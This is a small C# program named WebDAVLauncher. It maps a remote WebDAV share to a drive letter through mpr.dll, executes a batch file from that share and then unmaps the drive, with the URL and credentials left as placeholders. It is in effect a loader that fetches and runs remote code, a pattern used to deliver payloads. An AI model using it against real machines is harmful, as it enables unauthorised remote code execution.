using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace WebDAVLauncher
{
    class WebDAVenture
    {
        // Import the WNetAddConnection2 function from the mpr.dll library
        [DllImport("mpr.dll")]
        private static extern int WNetAddConnection2(ref NETRESOURCE lpNetResource, string lpPassword, string lpUsername, uint dwFlags);

        // Import the WNetCancelConnection2 function from the mpr.dll library
        [DllImport("mpr.dll")]
        private static extern int WNetCancelConnection2(string lpName, uint dwFlags, bool bForce);

        [StructLayout(LayoutKind.Sequential)]
        private struct NETRESOURCE
        {
            public uint dwScope;
            public uint dwType;
            public uint dwDisplayType;
            public uint dwUsage;
            public string lpLocalName;
            public string lpRemoteName;
            public string lpComment;
            public string lpProvider;
        }

        static void Main(string[] args)
        {
            string driveLetter = "drive letter as (Z:)";
            string webdavUrl = "https://your-webdav-share";
            string fileToExecute = Path.Combine(driveLetter, "change-me.bat"); // Adjust the file name and extension
            string username = "example"; // Optional - set this to null if no username is needed
            string password = "example"; // Optional - set this to null if no pass is needed

            try
            {
                // Map the WebDAV share to the specified drive letter
                MapWebDAVDrive(driveLetter, webdavUrl, username, password);

                // Execute the file
                ExecuteFile(fileToExecute);
            }
            finally
            {
                // Unmap the WebDAV share from the specified drive letter
                UnmapWebDAVDrive(driveLetter);
            }
        }

        private static void MapWebDAVDrive(string driveLetter, string webdavUrl, string username, string password)
        {
            NETRESOURCE netResource = new NETRESOURCE
            {
                dwType = 1, // RESOURCETYPE_DISK
                lpLocalName = driveLetter,
                lpRemoteName = webdavUrl
            };

            int result = WNetAddConnection2(ref netResource, password, username, 0);

            if (result != 0)
            {
                throw new Exception($"Error mapping WebDAV drive: {result}");
            }

            Console.WriteLine($"Mapped {webdavUrl} to {driveLetter}");
        }

        private static void ExecuteFile(string filePath)
        {
            if (!File.Exists(filePath))
            {
                Console.WriteLine($"File {filePath} does not exist.");
                return;
            }

            try
            {
                Process.Start(filePath);
                Console.WriteLine($"Successfully executed {filePath}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"Error executing file: {e.Message}");
            }
        }

        private static void UnmapWebDAVDrive(string driveLetter)
        {
            int result = WNetCancelConnection2(driveLetter, 0, true);

            if (result != 0)
            {
                Console.WriteLine($"Error unmapping WebDAV drive: {result}");
            }
            else
            {
                Console.WriteLine($"Unmapped drive {driveLetter}");
            }
        }
    }
}